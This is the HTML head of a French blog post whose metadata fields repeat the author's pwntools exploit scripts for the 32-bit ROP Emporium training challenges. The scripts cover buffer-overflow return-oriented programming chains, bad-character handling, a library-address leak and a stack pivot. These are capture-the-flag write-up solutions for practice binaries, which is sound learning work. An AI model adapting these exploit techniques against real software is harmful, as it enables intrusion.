<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>ROP Emporium (32-bits) | kik0uO7</title>
<meta name="generator" content="Jekyll v4.1.1" />
<meta property="og:title" content="ROP Emporium (32-bits)" />
<meta name="author" content="kik0uO7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 32bits de ROP Emporium. Les scripts présent ici ont été testés sur la version Juillet 2020 des challenges ret2win32 Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack. Le binaire est disponible sur le site officiel, ici solution : from pwn import * context.arch = &quot;i386&quot; elf = ELF(&#39;ret2win32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) payload = padding + p32(elf.sym.ret2win) io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.info(&#39;Sending payload...&#39;) log.success(io.recvall().decode()) split32 In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain. Le binaire est disponible sur le site officiel, ici solution : from pwn import * context.arch = &quot;i386&quot; context.endian = &#39;little&#39; elf = ELF(&#39;./split32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) rop = ROP(elf) rop.call(&#39;system&#39;, [&quot;/bin/sh&quot;]) chain = rop.chain() system = p32(elf.sym.system) printFlag = p32(0x804a030) payload = padding + system + b&#39;AAAA&#39; + printFlag io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) callme32 Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table. Le binaire est disponible sur le site officiel, ici solution : from pwn import * elf = ELF(&#39;./callme32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) call1 = p32(elf.sym.callme_one) call2 = p32(elf.sym.callme_two) call3 = p32(elf.sym.callme_three) gadget = p32(0x080487f9) param1 = p32(0xdeadbeef) param2 = p32(0xcafebabe) param3 = p32(0xd00df00d) # gdb.attach(io.proc.pid, &#39;b*0xf7fc864f&#39;) payload = padding payload += call1 + gadget + param1 + param2 + param3 payload += call2 + gadget + param1 + param2 + param3 payload += call3 + gadget + param1 + param2 + param3 io.sendline(payload) log.success(io.recvall().decode()) write432 Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow. Le binaire est disponible sur le site officiel, ici solution : from pwn import * libWrite = ELF(&#39;./libwrite432.so&#39;) elf = ELF(&#39;./write432&#39;) io = elf.process() # On va écrire flag.txt en mémoire. # Puis l&#39;appelé avec print_flag qui est dans la librairie partagé linwrite432.so # C&#39;est un endroit ou on peut écrire. write_addr = 0x804a0a0 def rop_chain_write(string): # Permet de mettre les valeurs qu&#39;on veut dans ebp, est dans esp. # pop edi; pop ebp; ret; gadget_pop = p32(0x080485aa) # Permet d&#39;écrire une valeur à une adresse voulue. # mov dword ptr [edi], ebp; ret; gadget_mov = p32(0x08048543) rop = b&#39;&#39; size_str = len(string) if not (size_str%4) == 0: string = (string+b&#39;\x00&#39;*(size_str // 4))[:((size_str // 4) + 1)*4] for i in range(len(string) // 0x4): rop += gadget_pop rop += p32(write_addr + (i *0x4)) rop += string[i * 0x4 : (i+1) * 0x4] rop += gadget_mov return rop print_f = p32(elf.sym.print_file) + b&#39;RET!&#39; + p32(write_addr) io.recvuntil(b&#39;&gt; &#39;) padding = b&#39;A&#39; * 44 payload = padding + rop_chain_write(b&#39;flag.txt&#39;) + print_f io.sendline(payload) log.success(io.recvall().decode()) badchars32 An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit. Le binaire est disponible sur le site officiel, ici solution : from pwn import * io = process(&#39;./badchars32&#39;) # Adresse ou on va écrire. write_addr = 0x804a130 # 0x08048547: xor byte ptr [ebp], bl; ret; gadget_xor = p32(0x08048547) # 0x0804854f: mov dword ptr [edi], esi; ret; gadget_mov = p32(0x0804854f) # 0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret; gadget_pop = p32(0x080485b8) ### Les mauvais caractères. badchars = b&#39;agx.&#39; def pop_chain(ebx, esi, edi, ebp): return gadget_pop + ebx + esi + edi + ebp def chain_badchars(b, offset): bad_rop = b&#39;&#39; xor_key = 0xff ## On va parcourir la chaine octet par octet, afin de de xored uniquement le dernier octet de chaque, ## car le on xor que le premier caractère de chaque dword. for i, val in enumerate(b): if val in badchars: xored = p32(u32(chr(val).encode() + b&#39;\x00\x00\x00&#39;) ^ xor_key) ### ebx, esi, edi, ebp -&gt; edi == ebp car pointe sur la même adresse. bad_rop += pop_chain(p32(xor_key), xored, p32(write_addr + offset + i), p32(write_addr + offset + i)) bad_rop += gadget_mov + gadget_xor else: bad_rop += pop_chain(p32(0x0), chr(val).encode() + b&#39;\x00\x00\x00&#39;, p32(write_addr + offset + i), p32(0x0)) bad_rop += gadget_mov return bad_rop def chain_goodchars(b, offset): return pop_chain(p32(0x0), b, p32(write_addr + offset), p32(0x0)) + gadget_mov def ropchain_badchars(strbytes): size_str = len(strbytes) rop_chain = b&#39;&#39; ## Rajoute des \x00 si la chaine n&#39;est pas un multiple de 4. if not (size_str % 4) == 0: strbytes = (strbytes+b&#39;\x00&#39;*(size_str//4))[ : ((size_str//4) + 1) * 4] ## Coupe la chaine de bytes en blocs de 4. array_dword = [strbytes[ i * 4 : (i+1) * 4] for i in range(len(strbytes) // 4)] for i, val in enumerate(array_dword): print(val) if b&#39;a&#39; in val or b&#39;g&#39; in val or b&#39;x&#39; in val or b&#39;.&#39; in val: rop_chain += chain_badchars(val, (i * 4)) else: rop_chain += chain_goodchars(val, (i * 4)) return rop_chain if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 44 rop = ropchain_badchars(b&#39;/etc/&#39;) print_file = p32(0x080483d0) + b&#39;RET!&#39; + p32(write_addr) payload = padding + rop + print_file io.recvuntil(&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) fluff32 The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed. Le binaire est disponible sur le site officiel, ici solution : from pwn import * io = process(&#39;./fluff32&#39;) addr_write = 0x804ae90 def align32(s): return (&#39;0&#39;*32+s)[-32:] def pext(src, mask): res = &quot;&quot; src_bin = align32(bin(src)[2:]) mask_bin = align32(bin(mask)[2:]) for i in range(len(mask_bin)-1, 0, -1): if mask_bin[i] == &#39;1&#39;: res = src_bin[i] + res return int(res,2) def get_bytes_by_char(char): for i in range(0xff): if chr(pext(i, 0xdeadbeef) &amp; 0xff) == char: return chr(i).encode(&#39;latin1&#39;) def rop_write(data): rop = gadget_pext for offset, char in enumerate(data): pext_value = get_bytes_by_char(chr(char)) rop += gadget_pop + pext_value + b&#39;\x00&#39;*3 + gadget_pext rop += gadget_set_ecx + p32(addr_write + offset, endian=&#39;big&#39;) rop += gadget_xchg return rop ##################### ###### GADGETS ###### ##################### # 0x08048558: pop ecx; bswap ecx; ret; gadget_set_ecx = p32(0x08048558) # 0x08048555: xchg byte ptr [ecx], dl; ret; gadget_xchg = p32(0x08048555) # 0x080485d6: pop ebx; ret; gadget_pop = p32(0x080485d6) # 0x0804854a: pext edx, ebx, eax; mov eax, 0xdeadbeef; ret; gadget_pext = p32(0x0804854a) if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 44 payload = padding payload += rop_write(b&#39;./flag.txt&#39;) payload += p32(0x080483d0) + b&#39;RET!&#39; + p32(addr_write) io.recvuntil(b&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) pivot32 There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location. Le binaire est disponible sur le site officiel, ici solution : from pwn import * libpivot32 = ELF(&quot;libpivot32.so&quot;, False) elf = ELF(&#39;./pivot32&#39;, False) io = elf.process() # gdb.attach(io.proc.pid, &#39;b*pwnme+198&#39;) padding = b&#39;A&#39; * 44 ### GADGET ### # 0x0804882e: xchg eax, esp; ret; gadget_xchg = p32(0x0804882e) # 0x0804882c: pop eax; ret; gadget_pop = p32(0x0804882c) ## Adresse utile. addr_puts = p32(elf.plt[&#39;puts&#39;]) addr_foothold_fun_plt = p32(elf.plt[&#39;foothold_function&#39;]) addr_foothold_fun_got = p32(elf.got[&#39;foothold_function&#39;]) addr_main = p32(elf.symbols[&#39;main&#39;]) ## On va faire pivoter le stack. data = io.recvuntil(&#39;&gt; &#39;) addr_heap = int(data.split(b&#39;\n&#39;)[4].split(b&#39; &#39;)[-1], 16) log.success(f&quot;pivot : {hex(addr_heap)}&quot;) ### Leaks libpivot32.so rop1 = addr_foothold_fun_plt rop1 += addr_puts rop1 += addr_main rop1 += addr_foothold_fun_got io.sendline(rop1) io.recvuntil(b&#39;&gt; &#39;) ## Stack pivot payload_pivot = padding payload_pivot += gadget_pop payload_pivot += p32(addr_heap) payload_pivot += gadget_xchg io.sendline(payload_pivot) ## On calcul les adresses présentes dans libpivot32.so grâce au leak. data = io.recvuntil(&#39;x86&#39;) addr_foothold = u32(data.split(b&#39;\n&#39;)[2][:4]) log.success(f&#39;foothold_function : {hex(addr_foothold)}&#39;) base_libpivot = addr_foothold - libpivot32.symbols[&#39;foothold_function&#39;] log.success(f&quot;libpivot32.so : {hex(base_libpivot)}&quot;) addr_ret2win = base_libpivot + libpivot32.symbols[&#39;ret2win&#39;] log.success(f&#39;ret2win : {hex(addr_ret2win)}&#39;) log.info(&quot;Back to main!&quot;) io.recvuntil(&#39;&gt; &#39;) rop2 = p32(addr_ret2win) io.sendline(padding + rop2) io.recvuntil(&#39;&gt; &#39;) io.sendline() log.success(io.recvall().decode())" />
<meta property="og:description" content="Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 32bits de ROP Emporium. Les scripts présent ici ont été testés sur la version Juillet 2020 des challenges ret2win32 Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack. Le binaire est disponible sur le site officiel, ici solution : from pwn import * context.arch = &quot;i386&quot; elf = ELF(&#39;ret2win32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) payload = padding + p32(elf.sym.ret2win) io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.info(&#39;Sending payload...&#39;) log.success(io.recvall().decode()) split32 In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain. Le binaire est disponible sur le site officiel, ici solution : from pwn import * context.arch = &quot;i386&quot; context.endian = &#39;little&#39; elf = ELF(&#39;./split32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) rop = ROP(elf) rop.call(&#39;system&#39;, [&quot;/bin/sh&quot;]) chain = rop.chain() system = p32(elf.sym.system) printFlag = p32(0x804a030) payload = padding + system + b&#39;AAAA&#39; + printFlag io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) callme32 Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table. Le binaire est disponible sur le site officiel, ici solution : from pwn import * elf = ELF(&#39;./callme32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) call1 = p32(elf.sym.callme_one) call2 = p32(elf.sym.callme_two) call3 = p32(elf.sym.callme_three) gadget = p32(0x080487f9) param1 = p32(0xdeadbeef) param2 = p32(0xcafebabe) param3 = p32(0xd00df00d) # gdb.attach(io.proc.pid, &#39;b*0xf7fc864f&#39;) payload = padding payload += call1 + gadget + param1 + param2 + param3 payload += call2 + gadget + param1 + param2 + param3 payload += call3 + gadget + param1 + param2 + param3 io.sendline(payload) log.success(io.recvall().decode()) write432 Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow. Le binaire est disponible sur le site officiel, ici solution : from pwn import * libWrite = ELF(&#39;./libwrite432.so&#39;) elf = ELF(&#39;./write432&#39;) io = elf.process() # On va écrire flag.txt en mémoire. # Puis l&#39;appelé avec print_flag qui est dans la librairie partagé linwrite432.so # C&#39;est un endroit ou on peut écrire. write_addr = 0x804a0a0 def rop_chain_write(string): # Permet de mettre les valeurs qu&#39;on veut dans ebp, est dans esp. # pop edi; pop ebp; ret; gadget_pop = p32(0x080485aa) # Permet d&#39;écrire une valeur à une adresse voulue. # mov dword ptr [edi], ebp; ret; gadget_mov = p32(0x08048543) rop = b&#39;&#39; size_str = len(string) if not (size_str%4) == 0: string = (string+b&#39;\x00&#39;*(size_str // 4))[:((size_str // 4) + 1)*4] for i in range(len(string) // 0x4): rop += gadget_pop rop += p32(write_addr + (i *0x4)) rop += string[i * 0x4 : (i+1) * 0x4] rop += gadget_mov return rop print_f = p32(elf.sym.print_file) + b&#39;RET!&#39; + p32(write_addr) io.recvuntil(b&#39;&gt; &#39;) padding = b&#39;A&#39; * 44 payload = padding + rop_chain_write(b&#39;flag.txt&#39;) + print_f io.sendline(payload) log.success(io.recvall().decode()) badchars32 An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit. Le binaire est disponible sur le site officiel, ici solution : from pwn import * io = process(&#39;./badchars32&#39;) # Adresse ou on va écrire. write_addr = 0x804a130 # 0x08048547: xor byte ptr [ebp], bl; ret; gadget_xor = p32(0x08048547) # 0x0804854f: mov dword ptr [edi], esi; ret; gadget_mov = p32(0x0804854f) # 0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret; gadget_pop = p32(0x080485b8) ### Les mauvais caractères. badchars = b&#39;agx.&#39; def pop_chain(ebx, esi, edi, ebp): return gadget_pop + ebx + esi + edi + ebp def chain_badchars(b, offset): bad_rop = b&#39;&#39; xor_key = 0xff ## On va parcourir la chaine octet par octet, afin de de xored uniquement le dernier octet de chaque, ## car le on xor que le premier caractère de chaque dword. for i, val in enumerate(b): if val in badchars: xored = p32(u32(chr(val).encode() + b&#39;\x00\x00\x00&#39;) ^ xor_key) ### ebx, esi, edi, ebp -&gt; edi == ebp car pointe sur la même adresse. bad_rop += pop_chain(p32(xor_key), xored, p32(write_addr + offset + i), p32(write_addr + offset + i)) bad_rop += gadget_mov + gadget_xor else: bad_rop += pop_chain(p32(0x0), chr(val).encode() + b&#39;\x00\x00\x00&#39;, p32(write_addr + offset + i), p32(0x0)) bad_rop += gadget_mov return bad_rop def chain_goodchars(b, offset): return pop_chain(p32(0x0), b, p32(write_addr + offset), p32(0x0)) + gadget_mov def ropchain_badchars(strbytes): size_str = len(strbytes) rop_chain = b&#39;&#39; ## Rajoute des \x00 si la chaine n&#39;est pas un multiple de 4. if not (size_str % 4) == 0: strbytes = (strbytes+b&#39;\x00&#39;*(size_str//4))[ : ((size_str//4) + 1) * 4] ## Coupe la chaine de bytes en blocs de 4. array_dword = [strbytes[ i * 4 : (i+1) * 4] for i in range(len(strbytes) // 4)] for i, val in enumerate(array_dword): print(val) if b&#39;a&#39; in val or b&#39;g&#39; in val or b&#39;x&#39; in val or b&#39;.&#39; in val: rop_chain += chain_badchars(val, (i * 4)) else: rop_chain += chain_goodchars(val, (i * 4)) return rop_chain if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 44 rop = ropchain_badchars(b&#39;/etc/&#39;) print_file = p32(0x080483d0) + b&#39;RET!&#39; + p32(write_addr) payload = padding + rop + print_file io.recvuntil(&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) fluff32 The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed. Le binaire est disponible sur le site officiel, ici solution : from pwn import * io = process(&#39;./fluff32&#39;) addr_write = 0x804ae90 def align32(s): return (&#39;0&#39;*32+s)[-32:] def pext(src, mask): res = &quot;&quot; src_bin = align32(bin(src)[2:]) mask_bin = align32(bin(mask)[2:]) for i in range(len(mask_bin)-1, 0, -1): if mask_bin[i] == &#39;1&#39;: res = src_bin[i] + res return int(res,2) def get_bytes_by_char(char): for i in range(0xff): if chr(pext(i, 0xdeadbeef) &amp; 0xff) == char: return chr(i).encode(&#39;latin1&#39;) def rop_write(data): rop = gadget_pext for offset, char in enumerate(data): pext_value = get_bytes_by_char(chr(char)) rop += gadget_pop + pext_value + b&#39;\x00&#39;*3 + gadget_pext rop += gadget_set_ecx + p32(addr_write + offset, endian=&#39;big&#39;) rop += gadget_xchg return rop ##################### ###### GADGETS ###### ##################### # 0x08048558: pop ecx; bswap ecx; ret; gadget_set_ecx = p32(0x08048558) # 0x08048555: xchg byte ptr [ecx], dl; ret; gadget_xchg = p32(0x08048555) # 0x080485d6: pop ebx; ret; gadget_pop = p32(0x080485d6) # 0x0804854a: pext edx, ebx, eax; mov eax, 0xdeadbeef; ret; gadget_pext = p32(0x0804854a) if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 44 payload = padding payload += rop_write(b&#39;./flag.txt&#39;) payload += p32(0x080483d0) + b&#39;RET!&#39; + p32(addr_write) io.recvuntil(b&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) pivot32 There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location. Le binaire est disponible sur le site officiel, ici solution : from pwn import * libpivot32 = ELF(&quot;libpivot32.so&quot;, False) elf = ELF(&#39;./pivot32&#39;, False) io = elf.process() # gdb.attach(io.proc.pid, &#39;b*pwnme+198&#39;) padding = b&#39;A&#39; * 44 ### GADGET ### # 0x0804882e: xchg eax, esp; ret; gadget_xchg = p32(0x0804882e) # 0x0804882c: pop eax; ret; gadget_pop = p32(0x0804882c) ## Adresse utile. addr_puts = p32(elf.plt[&#39;puts&#39;]) addr_foothold_fun_plt = p32(elf.plt[&#39;foothold_function&#39;]) addr_foothold_fun_got = p32(elf.got[&#39;foothold_function&#39;]) addr_main = p32(elf.symbols[&#39;main&#39;]) ## On va faire pivoter le stack. data = io.recvuntil(&#39;&gt; &#39;) addr_heap = int(data.split(b&#39;\n&#39;)[4].split(b&#39; &#39;)[-1], 16) log.success(f&quot;pivot : {hex(addr_heap)}&quot;) ### Leaks libpivot32.so rop1 = addr_foothold_fun_plt rop1 += addr_puts rop1 += addr_main rop1 += addr_foothold_fun_got io.sendline(rop1) io.recvuntil(b&#39;&gt; &#39;) ## Stack pivot payload_pivot = padding payload_pivot += gadget_pop payload_pivot += p32(addr_heap) payload_pivot += gadget_xchg io.sendline(payload_pivot) ## On calcul les adresses présentes dans libpivot32.so grâce au leak. data = io.recvuntil(&#39;x86&#39;) addr_foothold = u32(data.split(b&#39;\n&#39;)[2][:4]) log.success(f&#39;foothold_function : {hex(addr_foothold)}&#39;) base_libpivot = addr_foothold - libpivot32.symbols[&#39;foothold_function&#39;] log.success(f&quot;libpivot32.so : {hex(base_libpivot)}&quot;) addr_ret2win = base_libpivot + libpivot32.symbols[&#39;ret2win&#39;] log.success(f&#39;ret2win : {hex(addr_ret2win)}&#39;) log.info(&quot;Back to main!&quot;) io.recvuntil(&#39;&gt; &#39;) rop2 = p32(addr_ret2win) io.sendline(padding + rop2) io.recvuntil(&#39;&gt; &#39;) io.sendline() log.success(io.recvall().decode())" />
<link rel="canonical" href="/ropemopium32bits" />
<meta property="og:url" content="/ropemopium32bits" />
<meta property="og:site_name" content="kik0uO7" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-10-10T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="ROP Emporium (32-bits)" />
<script type="application/ld+json">
{"url":"/ropemopium32bits","mainEntityOfPage":{"@type":"WebPage","@id":"/ropemopium32bits"},"author":{"@type":"Person","name":"kik0uO7"},"description":"Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 32bits de ROP Emporium. Les scripts présent ici ont été testés sur la version Juillet 2020 des challenges ret2win32 Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack. Le binaire est disponible sur le site officiel, ici solution : from pwn import * context.arch = &quot;i386&quot; elf = ELF(&#39;ret2win32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) payload = padding + p32(elf.sym.ret2win) io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.info(&#39;Sending payload...&#39;) log.success(io.recvall().decode()) split32 In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain. Le binaire est disponible sur le site officiel, ici solution : from pwn import * context.arch = &quot;i386&quot; context.endian = &#39;little&#39; elf = ELF(&#39;./split32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) rop = ROP(elf) rop.call(&#39;system&#39;, [&quot;/bin/sh&quot;]) chain = rop.chain() system = p32(elf.sym.system) printFlag = p32(0x804a030) payload = padding + system + b&#39;AAAA&#39; + printFlag io.recvuntil(b&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) callme32 Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table. Le binaire est disponible sur le site officiel, ici solution : from pwn import * elf = ELF(&#39;./callme32&#39;) io = elf.process() padding = b&#39;A&#39; * cyclic_find(&quot;laaa&quot;) call1 = p32(elf.sym.callme_one) call2 = p32(elf.sym.callme_two) call3 = p32(elf.sym.callme_three) gadget = p32(0x080487f9) param1 = p32(0xdeadbeef) param2 = p32(0xcafebabe) param3 = p32(0xd00df00d) # gdb.attach(io.proc.pid, &#39;b*0xf7fc864f&#39;) payload = padding payload += call1 + gadget + param1 + param2 + param3 payload += call2 + gadget + param1 + param2 + param3 payload += call3 + gadget + param1 + param2 + param3 io.sendline(payload) log.success(io.recvall().decode()) write432 Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow. Le binaire est disponible sur le site officiel, ici solution : from pwn import * libWrite = ELF(&#39;./libwrite432.so&#39;) elf = ELF(&#39;./write432&#39;) io = elf.process() # On va écrire flag.txt en mémoire. # Puis l&#39;appelé avec print_flag qui est dans la librairie partagé linwrite432.so # C&#39;est un endroit ou on peut écrire. write_addr = 0x804a0a0 def rop_chain_write(string): # Permet de mettre les valeurs qu&#39;on veut dans ebp, est dans esp. # pop edi; pop ebp; ret; gadget_pop = p32(0x080485aa) # Permet d&#39;écrire une valeur à une adresse voulue. # mov dword ptr [edi], ebp; ret; gadget_mov = p32(0x08048543) rop = b&#39;&#39; size_str = len(string) if not (size_str%4) == 0: string = (string+b&#39;\\x00&#39;*(size_str // 4))[:((size_str // 4) + 1)*4] for i in range(len(string) // 0x4): rop += gadget_pop rop += p32(write_addr + (i *0x4)) rop += string[i * 0x4 : (i+1) * 0x4] rop += gadget_mov return rop print_f = p32(elf.sym.print_file) + b&#39;RET!&#39; + p32(write_addr) io.recvuntil(b&#39;&gt; &#39;) padding = b&#39;A&#39; * 44 payload = padding + rop_chain_write(b&#39;flag.txt&#39;) + print_f io.sendline(payload) log.success(io.recvall().decode()) badchars32 An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit. Le binaire est disponible sur le site officiel, ici solution : from pwn import * io = process(&#39;./badchars32&#39;) # Adresse ou on va écrire. write_addr = 0x804a130 # 0x08048547: xor byte ptr [ebp], bl; ret; gadget_xor = p32(0x08048547) # 0x0804854f: mov dword ptr [edi], esi; ret; gadget_mov = p32(0x0804854f) # 0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret; gadget_pop = p32(0x080485b8) ### Les mauvais caractères. badchars = b&#39;agx.&#39; def pop_chain(ebx, esi, edi, ebp): return gadget_pop + ebx + esi + edi + ebp def chain_badchars(b, offset): bad_rop = b&#39;&#39; xor_key = 0xff ## On va parcourir la chaine octet par octet, afin de de xored uniquement le dernier octet de chaque, ## car le on xor que le premier caractère de chaque dword. for i, val in enumerate(b): if val in badchars: xored = p32(u32(chr(val).encode() + b&#39;\\x00\\x00\\x00&#39;) ^ xor_key) ### ebx, esi, edi, ebp -&gt; edi == ebp car pointe sur la même adresse. bad_rop += pop_chain(p32(xor_key), xored, p32(write_addr + offset + i), p32(write_addr + offset + i)) bad_rop += gadget_mov + gadget_xor else: bad_rop += pop_chain(p32(0x0), chr(val).encode() + b&#39;\\x00\\x00\\x00&#39;, p32(write_addr + offset + i), p32(0x0)) bad_rop += gadget_mov return bad_rop def chain_goodchars(b, offset): return pop_chain(p32(0x0), b, p32(write_addr + offset), p32(0x0)) + gadget_mov def ropchain_badchars(strbytes): size_str = len(strbytes) rop_chain = b&#39;&#39; ## Rajoute des \\x00 si la chaine n&#39;est pas un multiple de 4. if not (size_str % 4) == 0: strbytes = (strbytes+b&#39;\\x00&#39;*(size_str//4))[ : ((size_str//4) + 1) * 4] ## Coupe la chaine de bytes en blocs de 4. array_dword = [strbytes[ i * 4 : (i+1) * 4] for i in range(len(strbytes) // 4)] for i, val in enumerate(array_dword): print(val) if b&#39;a&#39; in val or b&#39;g&#39; in val or b&#39;x&#39; in val or b&#39;.&#39; in val: rop_chain += chain_badchars(val, (i * 4)) else: rop_chain += chain_goodchars(val, (i * 4)) return rop_chain if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 44 rop = ropchain_badchars(b&#39;/etc/&#39;) print_file = p32(0x080483d0) + b&#39;RET!&#39; + p32(write_addr) payload = padding + rop + print_file io.recvuntil(&#39;&gt; &#39;) io.sendline(payload) log.success(io.recvall().decode()) fluff32 The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed. Le binaire est disponible sur le site officiel, ici solution : from pwn import * io = process(&#39;./fluff32&#39;) addr_write = 0x804ae90 def align32(s): return (&#39;0&#39;*32+s)[-32:] def pext(src, mask): res = &quot;&quot; src_bin = align32(bin(src)[2:]) mask_bin = align32(bin(mask)[2:]) for i in range(len(mask_bin)-1, 0, -1): if mask_bin[i] == &#39;1&#39;: res = src_bin[i] + res return int(res,2) def get_bytes_by_char(char): for i in range(0xff): if chr(pext(i, 0xdeadbeef) &amp; 0xff) == char: return chr(i).encode(&#39;latin1&#39;) def rop_write(data): rop = gadget_pext for offset, char in enumerate(data): pext_value = get_bytes_by_char(chr(char)) rop += gadget_pop + pext_value + b&#39;\\x00&#39;*3 + gadget_pext rop += gadget_set_ecx + p32(addr_write + offset, endian=&#39;big&#39;) rop += gadget_xchg return rop ##################### ###### GADGETS ###### ##################### # 0x08048558: pop ecx; bswap ecx; ret; gadget_set_ecx = p32(0x08048558) # 0x08048555: xchg byte ptr [ecx], dl; ret; gadget_xchg = p32(0x08048555) # 0x080485d6: pop ebx; ret; gadget_pop = p32(0x080485d6) # 0x0804854a: pext edx, ebx, eax; mov eax, 0xdeadbeef; ret; gadget_pext = p32(0x0804854a) if __name__ == &quot;__main__&quot;: padding = b&#39;A&#39; * 44 payload = padding payload += rop_write(b&#39;./flag.txt&#39;) payload += p32(0x080483d0) + b&#39;RET!&#39; + p32(addr_write) io.recvuntil(b&quot;&gt; &quot;) io.sendline(payload) log.success(io.recvall().decode()) pivot32 There’s only enough space for a small ROP chain on the stack, but you’ve been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location. Le binaire est disponible sur le site officiel, ici solution : from pwn import * libpivot32 = ELF(&quot;libpivot32.so&quot;, False) elf = ELF(&#39;./pivot32&#39;, False) io = elf.process() # gdb.attach(io.proc.pid, &#39;b*pwnme+198&#39;) padding = b&#39;A&#39; * 44 ### GADGET ### # 0x0804882e: xchg eax, esp; ret; gadget_xchg = p32(0x0804882e) # 0x0804882c: pop eax; ret; gadget_pop = p32(0x0804882c) ## Adresse utile. addr_puts = p32(elf.plt[&#39;puts&#39;]) addr_foothold_fun_plt = p32(elf.plt[&#39;foothold_function&#39;]) addr_foothold_fun_got = p32(elf.got[&#39;foothold_function&#39;]) addr_main = p32(elf.symbols[&#39;main&#39;]) ## On va faire pivoter le stack. data = io.recvuntil(&#39;&gt; &#39;) addr_heap = int(data.split(b&#39;\\n&#39;)[4].split(b&#39; &#39;)[-1], 16) log.success(f&quot;pivot : {hex(addr_heap)}&quot;) ### Leaks libpivot32.so rop1 = addr_foothold_fun_plt rop1 += addr_puts rop1 += addr_main rop1 += addr_foothold_fun_got io.sendline(rop1) io.recvuntil(b&#39;&gt; &#39;) ## Stack pivot payload_pivot = padding payload_pivot += gadget_pop payload_pivot += p32(addr_heap) payload_pivot += gadget_xchg io.sendline(payload_pivot) ## On calcul les adresses présentes dans libpivot32.so grâce au leak. data = io.recvuntil(&#39;x86&#39;) addr_foothold = u32(data.split(b&#39;\\n&#39;)[2][:4]) log.success(f&#39;foothold_function : {hex(addr_foothold)}&#39;) base_libpivot = addr_foothold - libpivot32.symbols[&#39;foothold_function&#39;] log.success(f&quot;libpivot32.so : {hex(base_libpivot)}&quot;) addr_ret2win = base_libpivot + libpivot32.symbols[&#39;ret2win&#39;] log.success(f&#39;ret2win : {hex(addr_ret2win)}&#39;) log.info(&quot;Back to main!&quot;) io.recvuntil(&#39;&gt; &#39;) rop2 = p32(addr_ret2win) io.sendline(padding + rop2) io.recvuntil(&#39;&gt; &#39;) io.sendline() log.success(io.recvall().decode())","@type":"BlogPosting","headline":"ROP Emporium (32-bits)","dateModified":"2020-10-10T00:00:00+02:00","datePublished":"2020-10-10T00:00:00+02:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="kik0uO7" /></head>
<body><header class="site-header" role="banner">

